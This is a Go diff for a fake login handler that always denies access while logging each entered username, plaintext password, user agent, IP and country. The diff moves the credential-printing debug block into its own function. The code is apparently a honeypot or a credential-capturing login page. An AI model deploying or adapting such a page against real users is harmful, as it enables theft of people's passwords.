@@ -13,10 +13,10 @@ import (
 )
 
 type loginRequest struct {
-	Ajax       string `json:"ajax"`
-	Username   string `json:"username"`
-	Realm      string `json:"realm"`
-	Credential string `json:"credential"`
+	Ajax       string `form:"ajax" json:"ajax"`
+	Username   string `form:"username" json:"username"`
+	Realm      string `form:"realm" json:"realm"`
+	Credential string `form:"credential" json:"credential"`
 }
 
 func createLog(log *models.Log) error {
@@ -60,6 +60,19 @@ func getCountryByIP(ipv4 string) (string, error) {
 	return record.Country.IsoCode, nil
 }
 
+func debugRequest(log *models.Log) {
+	if ENV != "production" {
+		fmt.Printf("~~~~~~~~~~~~~~~~~")
+		fmt.Printf("\n [+] USERNAME: %s", log.Username)
+		fmt.Printf("\n [+] PASSWORD: %s", log.Password)
+		fmt.Printf("\n [+] UAGENT: %s", log.BrowserAgent)
+		fmt.Printf("\n [+] IPV4: %s", log.IPv4)
+		fmt.Printf("\n [+] Country: %s", log.Country)
+		fmt.Printf("\n [+] AS: %s", log.Country)
+		fmt.Printf("\n~~~~~~~~~~~~~~~~\n")
+	}
+}
+
 func loginViewHandler(c buffalo.Context) error {
 	c.Set("title", "Please Login")
 	return c.Render(http.StatusOK, r.HTML("views/login.plush.html"))
@@ -89,27 +102,14 @@ func loginUserCheckHandler(c buffalo.Context) error {
 		BrowserAgent: c.Request().Header.Get("User-Agent"),
 	}
 
+	debugRequest(log)
 	err = createLog(log)
 
 	if err != nil {
 		return err
 	}
 
-	if ENV != "production" {
-		fmt.Printf("~~~~~~~~~~~~~~~~~")
-		fmt.Printf("\n [+] USERNAME: %s", log.Username)
-		fmt.Printf("\n [+] PASSWORD: %s", log.Password)
-		fmt.Printf("\n [+] UAGENT: %s", log.BrowserAgent)
-		fmt.Printf("\n [+] IPV4: %s", log.IPv4)
-		fmt.Printf("\n [+] Country: %s", log.Country)
-		fmt.Printf("\n [+] AS: %s", log.Country)
-		fmt.Printf("\n~~~~~~~~~~~~~~~~\n")
-	}
-
 	c.Flash().Add("error", "Error: Permission denied.")
 
-	return c.Redirect(
-		http.StatusTemporaryRedirect,
-		"loginViewPath()",
-	)
+	return c.Render(http.StatusFound, r.HTML("views/login.plush.html"))
 }
